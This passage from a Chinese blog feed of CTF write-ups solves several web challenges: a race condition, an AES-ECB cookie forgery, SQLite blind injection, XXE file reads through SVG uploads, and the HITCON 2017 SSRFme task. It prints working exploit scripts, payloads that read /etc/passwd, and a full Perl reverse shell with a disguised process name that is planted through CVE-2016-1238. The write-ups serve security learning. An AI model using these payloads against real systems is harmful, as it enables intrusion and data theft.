class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'form_br'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">action</span>=<span class="string">'/move'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'move'</span> <span class="attr">value</span>=<span class="string">'br'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">id</span>=<span class="string">'br'</span> <span class="attr">onClick</span>=<span class="string">'$("#form_br").submit()'</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以猜测给出的是代表九个网格传的传值，通过POST传参，在<code>/move</code>页利用<code>move</code>参数传参以表示棋下的位置。<br>当我们进行传参的时候，发现经过一段时间棋盘上才出现，起初以为是网速问题，其实这段时间是服务器处理的时间，这个时候我们再传两个位置，构成一条直线，这样服务器只能对我们下的第一步棋进行反应，但是反应过来，我们已经下了三步棋，赢了…<br>这就是典型的条件竞争。</p><h2 id="Mixer"><a href="#Mixer" class="headerlink" title="Mixer"></a>Mixer</h2><p>这个题目我觉得还是有水平的，主要考察了对cookie的攻击，但是结合了<code>AES ECB</code>模式加密的知识，这其实也是<code>AES</code>加密模式中很简单的了。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，我们发现又是一个登录框：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web87.png" alt=""><br>还是提示我们要有admin权限，我们尝试用<code>admin/admin</code>登录，发现可以登录，但是第三个框的<code>is_admin</code>的值在输入的时候我们不能进行操作，从抓包效果来看，也不能进行更改：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web88.png" alt=""><br>但是我们发现cookie中有<code>user</code>的字段，猜测其后面的值是经过<code>AES ECB</code>模式加密的，这里如果需要对加密的机制有更深的理解，可以去<a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">这里</a>。<br>验证一下我们的猜测：通过更改其中一个值看一下回显<br><img src="http://www.ggb0n.cool/images/BUUCTF-web89.png" alt=""><br>我们发现，传入的用户名、密码那三项其实是通过JSON传输的，即：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"username"</span>:<span class="string">"admin"</span>,<span class="attr">"password"</span>:<span class="string">"admin"</span>,<span class="attr">"is_admin"</span>:<span class="string">"0"</span>&#125;</span><br></pre></td></tr></table></figure><p>从图中看到，当我们更改<code>user</code>中的一个值的时候，结果报了错误，因为JSON字符串已经变成了：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"first_name"</span>:<span class="string">"a??N??ZP!z??gF???"</span>:<span class="string">"admin"</span>,<span class="attr">"is_admin"</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>也就是说确实是对这一串JSON格式的字符串进行了<code>AES ECB</code>模式的加密，并且是<code>16</code>字节为一组进行加密的，那么我们解题就有突破口了。<br>获取flag我们需要构造如下的JSON串：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"username"</span>:<span class="string">"admin"</span>,<span class="attr">"password"</span>:<span class="string">"admin"</span>,<span class="attr">"is_admin"</span>:<span class="string">"1"</span>&#125;</span><br></pre></td></tr></table></figure><p>但是<code>is_admin</code>的值我们没法通过输入来控制，但是观察发现：<strong>从JSON的起始位置到用户名的第一个字母刚好是16个字节</strong>，那么我们构造一个类似于<code>a1.00000000000000</code>(14个0，一共16字节)的用户名，以及一个<code>4</code>字节的密码，那就又拿到了一个16字节的分组<code>1.00000000000000</code>，并且其值为<code>1</code>，同时到第三个<code>:</code>刚好是<code>64</code>字节，而进行加密的时候是对整个16字节的块进行加密的，那么我们再把<strong>这一个分组加密的结果插入到最后的16字节的密文之前</strong>(hex编码是32个字符)即可令<code>is_admin</code>的值为<code>1</code>了，这个时候<code>is_admin</code>其实是<code>1.000000000000000</code>(15个0)了，但是不影响它是<code>1</code>，同时不影响最后一个分组的加密(不够16字节会自动填充的)。</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>构造<code>username=a1.00000000000000&amp;password=admi</code>登录之后，利用BP抓包将第二个16字节的密文替换掉最后的16字节的密文，放包即可拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web90.png" alt=""><br>用下面的脚本的话操作起来更简单：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line">action=<span class="string">"?action=login&amp;first_name=a1.00000000000000&amp;last_name=admi"</span></span><br><span class="line">r = requests.get(url+action, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> r.cookies:</span><br><span class="line">    print(c.name, c.value)</span><br><span class="line">    <span class="keyword">if</span> c.name == <span class="string">"user"</span>:</span><br><span class="line">        c.value = c.value[:<span class="number">-32</span>] + c.value[<span class="number">32</span>:<span class="number">64</span>] + c.value[<span class="number">-32</span>:]</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, cookies = r.cookies, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> resp.text</span><br></pre></td></tr></table></figure><h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><p>在cookie处存在sql注入，利用盲注拿flag。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目是一个只含用户名和密码的登录框，经过尝试<code>guest/guest</code>可以登录，登录之后发现是一个<code>302跳转</code>，同时看到了有点怪的cookie：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web91.png" alt=""><br>对cookie的值进行base64解码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.b64decode(&quot;eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9&quot;)</span><br><span class="line">&#39;&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>可以看到用户名和密码是通过JSON编码传输的，那么JSON中的<code>username</code>或<code>password</code>会不会存在注入点呢？利用下面的payload测试一下：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"username"</span>:<span class="string">"guest\" or \"A\"=\"A"</span>,<span class="attr">"password"</span>:<span class="string">"guest"</span>&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>\</code>是用来转义的，防止在JSON中被编码了。<br>然后对上面的JSON串进行base64加密，这里我们利用python的库进行加密，同时用<code>r&#39;&#39;</code>告诉python不要把我们构造的<code>\</code>再进行转义：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.b64encode(r&#39;&#123;&quot;username&quot;:&quot;guest\&quot; or \&quot;A\&quot;&#x3D;\&quot;A&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#39;)</span><br><span class="line">&#39;eyJ1c2VybmFtZSI6Imd1ZXN0XCIgb3IgXCJBXCI9XCJBIiwicGFzc3dvcmQiOiJndWVzdCJ9&#39;</span><br></pre></td></tr></table></figure><p>替换掉cookie中的内容之后放包发现回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web92.png" alt=""><br>发现注入成功！这道题的数据库是<code>sqlite</code>，可以利用<code>sqlite_master</code>拿到库名，以便进一步的注入。<br>写脚本利用盲注爆库名、表名、字段名，拿flag。脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">URL = <span class="string">''</span></span><br><span class="line">LETTERS = string.printable</span><br><span class="line">target = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> LETTERS:</span><br><span class="line">        tmp = target + e</span><br><span class="line">        <span class="comment"># 1.获取库名</span></span><br><span class="line">        payload = <span class="string">r'&#123;&#123;"username":"\" or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),&#123;&#125;,1)=\"&#123;&#125;\" THEN true ELSE false END or \"","password":"guest"&#125;&#125;'</span>.format(len(tmp),e)</span><br><span class="line">        <span class="comment"># 2.获取username</span></span><br><span class="line">        <span class="comment">#payload = r'&#123;&#123;"username":"\" or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),&#123;&#125;,1)=\"&#123;&#125;\" THEN true ELSE false END or \"","password":"guest"&#125;&#125;'.format(len(tmp),e)</span></span><br><span class="line">        <span class="comment"># 3.获取password</span></span><br><span class="line">        <span class="comment">#payload = r'&#123;&#123;"username":"\" or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),&#123;&#125;,1)=\"&#123;&#125;\" THEN true ELSE false END or \"","password":"guest"&#125;&#125;'.format(len(tmp),e)</span></span><br><span class="line">        payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        req = requests.Request(</span><br><span class="line">            <span class="string">'GET'</span>,</span><br><span class="line">            URL,</span><br><span class="line">            params=&#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">"1337_AUTH"</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">            </span><br><span class="line">        prepared = req.prepare()</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        r = s.send(prepared, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Movie"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target = tmp</span><br><span class="line">            print(target)</span><br><span class="line">            f = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f: <span class="keyword">continue</span></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><p>拿到用户名和密码：<code>sequeladmin/f5ec3af19f0d3679e7d5a148f4ac323d</code>，登录即可拿到flag。</p><h2 id="SVGMagic"><a href="#SVGMagic" class="headerlink" title="SVGMagic"></a>SVGMagic</h2><p>考察<code>XXE</code>漏洞，在解析包含<code>SVG</code>可缩放矢量图形的<code>XML</code>文件时，构造XXE漏洞执行从而拿到服务器的目标文件。</p><h3 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h3><p><code>SVG</code>可缩放矢量图形可以参考<a href="https://www.runoob.com/svg/svg-tutorial.html">这里</a><br><code>XXE</code>漏洞参考<a href="https://www.freebuf.com/articles/web/126788.html">这里</a>和<a href="https://www.freebuf.com/articles/web/177979.html">这里</a></p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>进入题目，提示这个站可以实现<code>SVG</code>到<code>PNG</code>的转换，也就是说我们上传包含<code>SVG</code>信息的<code>XML</code>文件，那么将会返回一张<code>PNG</code>图片。<br><code>SVG</code>代码类似：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My first SVG<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">version</span>=<span class="string">"1.1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"100"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"40"</span> <span class="attr">stroke</span>=<span class="string">"black"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">stroke-width</span>=<span class="string">"2"</span> <span class="attr">fill</span>=<span class="string">"red"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>既然与<code>XML</code>的解析相关，那就考虑<code>XXE</code>攻击。<br>首先构造如下的<code>XML</code>脚本：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">"300"</span> <span class="attr">width</span>=<span class="string">"200"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"15"</span> <span class="attr">fill</span>=<span class="string">"red"</span>&gt;</span>test <span class="symbol">&amp;xxe;</span> test<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传之后，发现回显如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web84.png" alt=""><br>由此可见，我们上传的包含XXE攻击的脚本成功执行了，现在就想办法就拿到flag，那就需要找到flag文件的位置。</p><p>这个地方学到了新东西：利用<code>linux</code>系统的<code>proc</code>进程文件系统找当前进程中的文件，这个地方参考了网上的题解，虽然没有成功，但是还是学到了新东西，感觉以后会用得到。关于<code>proc</code>进程文件系统参考<a href="https://blog.csdn.net/danwuxie/article/details/80893655">这里</a>。</p><p>最后拿到flag的payload如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:flag.txt"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">"300"</span> <span class="attr">width</span>=<span class="string">"3000"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"15"</span> <span class="attr">fill</span>=<span class="string">"red"</span>&gt;</span>test <span class="symbol">&amp;xxe;</span> test<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用<code>file</code>命令直接读flag文件，即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web85.png" alt=""></p><p>看国外大佬的题解，讲到了刚开始想到了<code>ImageTragick</code>，也是之前不熟悉的知识，需要好好学习，参考<a href="https://imagetragick.com/">这里</a>。</p><h2 id="赛题BUU上都可以复现"><a href="#赛题BUU上都可以复现" class="headerlink" title="赛题BUU上都可以复现"></a>赛题BUU上都可以复现</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近BUU复现了BSidesSF2019几道题目，还比较简单，记录一下。
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="赛题复现" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="XXE攻击" scheme="http://ggb0n.cool/tags/XXE%E6%94%BB%E5%87%BB/"/>
    
      <category term="ImageTragick" scheme="http://ggb0n.cool/tags/ImageTragick/"/>
    
      <category term="条件竞争" scheme="http://ggb0n.cool/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    
      <category term="Cookie攻击" scheme="http://ggb0n.cool/tags/Cookie%E6%94%BB%E5%87%BB/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="布尔盲注" scheme="http://ggb0n.cool/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-web刷题Ⅲ</title>
    <link href="http://ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/"/>
    <id>http://ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/</id>
    <published>2020-02-15T07:14:12.000Z</published>
    <updated>2020-04-22T00:13:36.197Z</updated>
    
    <content type="html"><![CDATA[<p>BUU刷题记录之三了，刷题果然开眼界，不过… 我好菜😐，不是那个蔡😒<a id="more"></a></p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>主要考察<code>Perl</code>下存在的漏洞：<a href="https://nvd.nist.gov/vuln/detail/CVE-2016-1238">CVE-2016-1238</a>和<code>open</code>命令导致命令执行的漏洞。利用此漏洞进行SSRF。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，给出了如下的源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">    @mkdir($sandbox); </span><br><span class="line">    @chdir($sandbox); </span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>])); </span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]); </span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>])); </span><br><span class="line">    @mkdir($dir); </span><br><span class="line">    @chdir($dir); </span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data); </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>同时也给出了<code>REMOTE_ADDR</code>，这在后面解题用得到。<br>分析代码我们可以梳理出其逻辑：</p><blockquote><p>1.基于<code>REMOTE_ADDR</code>创建沙箱文件夹；<br>2.将传入的URL带入命令<code>GET</code>执行。这里的<code>GET</code>命令是<a href="https://blog.csdn.net/ace_fei/article/details/7258700">Lib for WWW in Perl</a>中的命令，目的是模拟<code>http</code>的<code>GET</code>请求；<br>3.利用<a href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfo函数</a>解析传入的<code>filename</code>参数，获取路径名最后一层文件夹创建并进入该路径；<br>4.利用<a href="https://www.runoob.com/php/func-filesystem-basename.html">basename函数</a>获取<code>filename</code>传参内容的最后以及文件夹名称；<br>5.利用​<a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">file_put_contents函数</a>将<code>GET</code>命令执行的结果写入以<code>filename</code>中的文件名命名的文件中。</p></blockquote><p>这一道题涉及的知识之前没遇到过，需要好好学一学，参考网上的题解得知有两种解题思路：</p><ul><li>利用<code>Perl5</code>的一个CVE</li><li>利用<code>Perl</code>的<code>open</code>命令进行命令执行</li></ul><h4 id="利用CVE-2016-1238"><a href="#利用CVE-2016-1238" class="headerlink" title="利用CVE-2016-1238"></a>利用CVE-2016-1238</h4><p>漏洞大致构成原因是：`</p><blockquote><p>当解析遇到了非定义的协议(定义的协议在<code>perl5/LWP/Protocol</code>文件夹下可以看到，默认支持<code>GHTTP</code>、<code>cpan</code>、<code>data</code>、<code>file</code>、<code>ftp</code>、<code>gopher</code>、<code>http</code>、<code>https</code>、<code>loopback</code>、<code>mailto</code>、<code>nntp</code>、<code>nogo</code>协议)时, 如<code>GGBON://ggb0n.com</code>，会自动读取当前目录下的URI目录并查看是否有对应协议的<code>pm模块</code>并尝试<code>eval &quot;require xxx&quot;</code>，这里我们的恶意pm模块就会被执行。</p></blockquote><p>借此漏洞构造一个反弹shell的perl脚本放到自己的VPS上：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any </span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后利用代码的逻辑构造payload：</p><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">/?<span class="attr">url=your</span> vps's perl backdoor&amp;<span class="attr">filename=URI/ggb0n.pm</span></span><br></pre></td></tr></table></figure><p>这就在沙箱文件夹的URL下写入了反弹shell的pm文件，最后在个人的VPS上监听pm文件中写好的端口并构造如下的payload进行访问：</p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">/?<span class="built_in">url</span>=<span class="attribute">GGBON</span>:<span class="comment">//ggb0n.com&amp;filename=xxx</span></span><br></pre></td></tr></table></figure><p>即可拿到shell。<br>注意：这里的<code>GGBON</code>可以为任意的不属于上面说到的可以解析的字符串。</p><h4 id="利用perl的open命令进行SSRF"><a href="#利用perl的open命令进行SSRF" class="headerlink" title="利用perl的open命令进行SSRF"></a>利用perl的open命令进行SSRF</h4><p>首先扩展一下<code>open</code>命令导致命令执行的过程，参考网上的资料：</p><blockquote><p>Executing Programs with “open”<br>In addition to what we saw last week, the “open” command has one more very<br>powerful application: it allows you to execute a command, send input and<br>receive output.<br>Try this program (it only works on Unix):</p></blockquote><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line">  <span class="keyword">use</span> strict;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">open</span> DATA, <span class="string">"who |"</span>   <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"Couldn't execute program: $!"</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="keyword">defined</span>( <span class="keyword">my</span> $line = &lt;DATA&gt; )  ) &#123;</span><br><span class="line">    <span class="keyword">chomp</span>($line);</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$line\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">close</span> DATA;</span><br></pre></td></tr></table></figure><blockquote><p>Here’s what happened: Perl saw that your “file” ended with a “pipe” (verticalbar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”‘s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.</p><p>In this case, we “read” data from the command. To execute a command that we can “write” (send data) to, we should place a pipe character BEFORE the command. These options are mutually exclusive: we can read from a command or write to it, but not both.</p><p>In the Unix world, a lot can be done by piping the output of one program into the input of another. Perl continues this spirit.</p><p>Note that we can also send command-line parameters to the command, like 